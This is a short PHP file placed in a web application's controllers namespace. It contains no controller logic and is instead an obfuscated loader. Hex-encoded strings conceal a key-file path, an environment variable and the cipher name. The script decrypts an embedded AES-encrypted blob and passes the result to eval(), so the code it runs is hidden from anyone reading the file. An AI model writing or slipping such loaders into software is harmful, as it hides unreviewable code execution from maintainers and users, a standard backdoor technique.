<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+7zsUE7pF8p8eZgXoCp9xg==');

$c=base64_decode(

'ferRVC7DP8gtM6iThW3Ne7zHZ1PBuusE21iOt0QncnaGAfKmttr8Pt0qSPhHeL5y07o28XspZbSe' .
'HNzPgjQLRD/lvZj8ED2743CO9ocJsrBLBUypvbsSRQylqoeb4yfbbwOob+oPtrJp2ZOrbrqVxCVj' .
'79JOK81ZocmecYI/d/sJ+hyRXIHyxh6SxfKHNg1Aj/8c+zOYRAez7QyT/OZypx0NB6MWjeILzjp5' .
'FTA1DKjemmCtyXN4W0KXC1KaadB9wdRs2IbF/00ifAkv1BMFslvDYgjd1PYPaYXvUldy7HWb51+I' .
'SMPJ0k26anwPqwymWGyhY1rrF9hK83baxQb//u1K0xKCQs24Ttw722bQFF0YvdDxcwM/qYId9yHT' .
'ygYqCRaBAPOjRvmL1DhHIw9wgA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

